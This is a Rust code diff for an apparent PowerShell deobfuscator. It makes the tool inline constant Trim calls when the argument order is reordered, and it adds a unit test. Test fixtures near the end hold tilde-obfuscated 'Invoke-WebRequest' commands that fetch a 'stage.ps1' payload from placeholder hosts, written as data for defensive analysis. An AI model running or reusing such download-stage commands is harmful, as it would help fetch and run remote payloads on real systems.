@@ -3934,7 +3934,15 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
             continue;
         };
 
-        out = inline_ps_literal_const_trim_calls(&out, &name, value_idx, value_var, kind, &chars);
+        out = inline_ps_literal_const_trim_calls(
+            &out,
+            &name,
+            value_idx,
+            value_var,
+            param_index.len(),
+            kind,
+            &chars,
+        );
     }
     out
 }
@@ -5770,6 +5778,7 @@ fn inline_ps_literal_const_trim_calls(
     name: &str,
     value_idx: usize,
     value_name: &str,
+    arg_count: usize,
     kind: PsTrimKind,
     chars: &str,
 ) -> String {
@@ -5812,23 +5821,16 @@ fn inline_ps_literal_const_trim_calls(
                     continue;
                 }
             }
-            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
+                text,
+                pos,
+                parenthesized,
+                value_idx,
+                arg_count,
+            ) else {
                 search_from = end_name;
                 continue;
             };
-            let mut call_end = value_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = value_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-            if value_idx != 0 {
-                search_from = call_end;
-                continue;
-            }
             let Some(replacement) = ps_literal_const_trim_replacement(&value, kind, chars) else {
                 search_from = call_end;
                 continue;
@@ -9536,6 +9538,23 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-const-trim-extractor.example/stage.p
                 "'Invoke-WebRequest -Uri https://ps-const-trim-extractor.example/stage.ps1'"
             ),
             "constant trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_trim_extractor_reordered_call_is_rewritten() {
+        let text = r#"function Clean($unused,$value) {
+  return $value.Trim('~')
+}
+Clean 0 '~~~Invoke-WebRequest -Uri https://ps-reordered-const-trim-extractor.example/stage.ps1~~~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-reordered-const-trim-extractor.example/stage.ps1'"
+            ),
+            "reordered constant trim extractor call was not rewritten:\n{out}"
         );
     }
 
